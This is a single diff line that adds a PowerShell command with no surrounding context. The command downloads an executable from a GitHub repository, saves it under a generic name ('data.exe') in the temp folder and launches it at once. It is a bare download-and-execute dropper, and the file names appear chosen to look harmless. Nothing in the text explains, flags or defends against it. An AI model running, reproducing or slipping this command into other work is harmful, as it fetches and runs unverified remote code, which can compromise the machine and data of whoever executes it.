@@ -1,0 +1,1 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ggbtty/boyDemo/raw/main/github.exe' -OutFile "$env:TEMP\data.exe"; Start-Process "$env:TEMP\data.exe"
